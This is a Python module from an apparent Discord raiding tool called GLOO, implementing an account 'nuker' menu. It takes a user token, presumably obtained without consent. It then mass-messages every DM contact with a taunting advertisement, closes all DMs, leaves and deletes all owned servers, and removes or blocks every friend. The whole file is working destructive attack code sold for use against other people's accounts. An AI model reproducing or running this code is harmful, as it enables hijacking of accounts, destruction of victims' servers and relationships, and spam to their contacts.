
from core import *
from core.funcs.token.Nuker import *

dmmsg = '''
This guy just took a big L! :man_facepalming:

His account got nuked. Someone used **GLOO** raider! :partying_face: 

`Website:` [gloo.lol](https://gloo.lol)
`Store:` [sell.app](https://lostroes.sell.app)

`Image:` [url](https://i.postimg.cc/T29YPrR8/bannernew.png)
'''

class options:
    def BlockAllFriends(token):
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(f'[Gloo Raider]  |  [Block Friends]  |  [Tokens: {counttokens}]  |  [Proxies: {countproxies}]  |  [https://gloo.lol]')

            blockedfriends = 0
            def counter():
                if blockedfriends < 1:
                    print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}> {w}Blocked {blockedfriends} friends.")
                if blockedfriends == 1:
                    print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}> {w}Blocked {blockedfriends} friend.")
                elif blockedfriends > 1:
                    print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}> {w}Blocked {blockedfriends} friends.")

            clearprint()

            sesheaders = headers.copy()
            sesheaders.update({"Authorization": token})

            json = {"type": 2}
            block_friends_request = requests.get("https://canary.discord.com/api/v9/users/@me/relationships", headers=sesheaders).json()


            ctypes.windll.kernel32.SetConsoleTitleW(f'[Gloo Raider]  |  [Blocking Friends]  |  [Tokens: {counttokens}]  |  [Proxies: {countproxies}]  |  [https://gloo.lol]')

            print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}>{w} Blocking friends...")
            for i in block_friends_request:
                requests.put(
                    f"https://canary.discord.com/api/v9/users/@me/relationships/{i['id']}",
                    headers=sesheaders,
                    json=json,
                )
                blockedfriends +=1

            clearprint()
            counter()
        except Exception as e:
            clearprint()
            print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}ERROR{o}] {s}>{w} {e}")

    def RemoveAllFriends(token):

        sesheaders = headers.copy()
        sesheaders.update({"Authorization": token})

        removedfriends = 0
        def counter():
            if removedfriends < 1:
                print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}> {w}Removed {removedfriends} friends.")
            if removedfriends == 1:
                print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}> {w}Removed {removedfriends} friend.")
            elif removedfriends > 1:
                print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}> {w}Removed {removedfriends} friends.")

        clearprint()
        time_rn = getting.get_time_rn()
        ctypes.windll.kernel32.SetConsoleTitleW(f'[Gloo Raider]  |  [Remove Friends]  |  [Tokens: {counttokens}]  |  [Proxies: {countproxies}]  |  [https://gloo.lol]')
        
        friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=sesheaders).json()
        print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}> {w}Removing Friends...")
        for friend in friendIds:
            try:
                requests.delete(
                    f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], headers=sesheaders)
                
                removedfriends +=1
            except Exception as e:
                pass
        
        clearprint()
        counter()

    def LeaveAllServers(token):

        ctypes.windll.kernel32.SetConsoleTitleW(f'[Gloo Raider]  |  [Leave Servers]  |  [Tokens: {counttokens}]  |  [Proxies: {countproxies}]  |  [https://gloo.lol]')

        print(f"          {o}[{w}You may need to run the script a few times, API seems a bit fussy about leaving servers{o}]")
        input(f"\n           {o}[{m}GLOO{o}] {s}| {o}[{m}INPUT{o}] {s}>{w} Press ENTER to continue.{d}")

        clearprint()

        
        leaveservers = 0
        def counter():
            if leaveservers < 1:
                print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}> {w}Left {leaveservers} servers.")
            if leaveservers == 1:
                print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}> {w}Left {leaveservers} server.")
            elif leaveservers > 1:
                print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}> {w}Left {leaveservers} servers.")


        sesheaders = headers.copy()
        sesheaders.update({"Authorization": token})
        guildsIds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=sesheaders).json()


        ctypes.windll.kernel32.SetConsoleTitleW(f'[Gloo Raider]  |  [Leaving Servers]  |  [Tokens: {counttokens}]  |  [Proxies: {countproxies}]  |  [https://gloo.lol]')

        print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}> {w}Leaving Servers...")

        for guild in guildsIds:
            try:
                requests.delete(
                    f'https://discord.com/api/v9/users/@me/guilds/'+guild['id'], headers=sesheaders)
            except Exception as e:
                pass

        clearprint()
        counter()

    def DeleteAllServers(token):
        ctypes.windll.kernel32.SetConsoleTitleW(f'[Gloo Raider]  |  [Server Deleter]  |  [Tokens: {counttokens}]  |  [Proxies: {countproxies}]  |  [https://gloo.lol]')

        clearprint()

        sesheaders = headers.copy()
        sesheaders.update({"Authorization": token})

        deletedservers = 0
        def counter():
            if deletedservers < 1:
                print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}> {w}Deleted {deletedservers} servers.")
            if deletedservers == 1:
                print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}> {w}Deleted {deletedservers} server.")
            elif deletedservers > 1:
                print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}> {w}Deleted {deletedservers} servers.")

        
        guildsIds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=sesheaders).json()

        ctypes.windll.kernel32.SetConsoleTitleW(f'[Gloo Raider]  |  [Deleting Servers]  |  [Tokens: {counttokens}]  |  [Proxies: {countproxies}]  |  [https://gloo.lol]')

        print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}> {w}Deleting servers...")

        for guild in guildsIds:
            try:
                requests.delete(f'https://discord.com/api/v9/guilds/'+guild['id'], headers=sesheaders)
                deletedservers +=1
            except Exception as e:
                pass

        clearprint()
        counter() 

    def CloseAllDMs(token):
        ctypes.windll.kernel32.SetConsoleTitleW(f'[Gloo Raider]  |  [Close DMs]  |  [Tokens: {counttokens}]  |  [Proxies: {countproxies}]  |  [https://gloo.lol]')

        clearprint()

        closeddms = 0
        def counter():
            if closeddms < 1:
                print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}> {w}Closed {closeddms} direct messages.")
            if closeddms == 1:
                print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}> {w}Closed {closeddms} direct message.")
            elif closeddms > 1:
                print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}> {w}Closed {closeddms} direct messages.")


        sesheaders = headers.copy()
        sesheaders.update({"Authorization": token})

        close_dm_request = requests.get("https://canary.discord.com/api/v9/users/@me/channels", headers=sesheaders).json()

        ctypes.windll.kernel32.SetConsoleTitleW(f'[Gloo Raider]  |  [Closing DMs]  |  [Tokens: {counttokens}]  |  [Proxies: {countproxies}]  |  [https://gloo.lol]')

        print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}> {w}Closing direct messages...")

        for channel in close_dm_request:
            closeddms +=1
            requests.delete(f"https://canary.discord.com/api/v9/channels/{channel['id']}", headers=sesheaders)
        
        clearprint()
        counter()

    def MassDM(token, content):
        ctypes.windll.kernel32.SetConsoleTitleW(f'[Gloo Raider]  |  [Mass DM]  |  [Tokens: {counttokens}]  |  [Proxies: {countproxies}]  |  [https://gloo.lol]')

        clearprint()
        masdmcount = 0

        sesheaders = headers.copy()
        sesheaders.update({"Authorization": token})

        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=sesheaders).json()
        print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}> {w}Started sending Messages...")
        for channel in channelIds:
            try:
                masdmcount +=1
                requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',
                headers=sesheaders,
                data={"content": f"{content}"})

            except Exception as e:
                pass

        def counter():
            if masdmcount < 1:
                print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}> {w}Sent {masdmcount} direct messages.")
            if masdmcount == 1:
                print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}> {w}Sent {masdmcount} direct message.")
            elif masdmcount > 1:
                print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}> {w}Sent {masdmcount} direct messages.")

        clearprint()
        counter()

    def Nuke_account(token):
        options.MassDM(token, dmmsg)
        options.CloseAllDMs(token)
        options.LeaveAllServers(token)
        options.DeleteAllServers(token)
        options.RemoveAllFriends(token)
        clearprint()
        print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}>{w} Account Nuked!")
        sleep(1)
        input(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INPUT{o}] {s}>{w} Press ENTER to go back.{d}")

def Nuker():
    titles('TNUKER')
    clearprint()
    print(f"""                                 {o}[{m}01{o}] {s}>{w} Remove Friends  {o}[{m}02{o}] {s}>{w} Block Friends
                                 {o}[{m}03{o}] {s}>{w} Delete Servers  {o}[{m}04{o}] {s}>{w} Leave Servers
                                 {o}[{m}05{o}] {s}>{w} Close DMs       {o}[{m}06{o}] {s}>{w} Mass DM
        
                                 {o}[{m}07{o}] {s}> {w}Run all the options.""")

    choice = input(f"\n                                 {o}[{m}GLOO{o}] {s}| {o}[{m}INPUT{o}] {s}>{w} ")
    if choice == "1":
        clearprint()
        token = input(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}TOKEN{o}] {s}> [INPUT HIDDEN]{d}")
        if not addons.validatetoken(token):
            return  
        options.RemoveAllFriends(token)
        input(f"\n                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INPUT{o}] {s}>{w} Press ENTER to go back.{d}")
        Nuker()
    elif choice == "2":
        clearprint()
        token = input(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}TOKEN{o}] {s}> [INPUT HIDDEN]{d}")
        if not addons.validatetoken(token):
            return  
        options.BlockAllFriends(token)
        input(f"\n                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INPUT{o}] {s}>{w} Press ENTER to go back.{d}")
        Nuker()
    elif choice == "3":
        clearprint()
        token = input(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}TOKEN{o}] {s}> [INPUT HIDDEN]{d}")
        if not addons.validatetoken(token):
            return  
        options.DeleteAllServers(token)
        input(f"\n                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INPUT{o}] {s}>{w} Press ENTER to go back.{d}")
        Nuker()
    elif choice == "4":
        clearprint()
        token = input(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}TOKEN{o}] {s}> [INPUT HIDDEN]{d}")
        if not addons.validatetoken(token):
            return  
        options.LeaveAllServers(token)
        input(f"\n                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INPUT{o}] {s}>{w} Press ENTER to go back.{d}")
        Nuker()
    elif choice == "5":
        clearprint()
        token = input(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}TOKEN{o}] {s}> [INPUT HIDDEN]{d}")
        if not addons.validatetoken(token):
            return  
        options.CloseAllDMs(token)
        input(f"\n                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INPUT{o}] {s}>{w} Press ENTER to go back.{d}")
        Nuker()
    elif choice == "6":
        clearprint()
        content = input(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}MESSAGE{o}] {s}>{w} ")
        token = input(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}TOKEN{o}] {s}> [INPUT HIDDEN]{d}")
        if not addons.validatetoken(token):
            return  
        options.MassDM(token, content)
        input(f"\n                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INPUT{o}] {s}>{w} Press ENTER to go back.{d}")
        Nuker()
    elif choice == "7":
        clearprint()
        token = input(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}TOKEN{o}] {s}> [INPUT HIDDEN]{d}")
        if not addons.validatetoken(token):
            return  
        options.Nuke_account(token)
        input(f"\n                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INPUT{o}] {s}>{w} Press ENTER to go back.{d}")
        Nuker()
    elif choice == "":
        pass
    else:
        print(f"                                   {o}[{m}GLOO{o}] {s}| {o}[{m}INFO{o}] {s}>{w} Invalid Input, try again.")
        sleep(1)
        Nuker()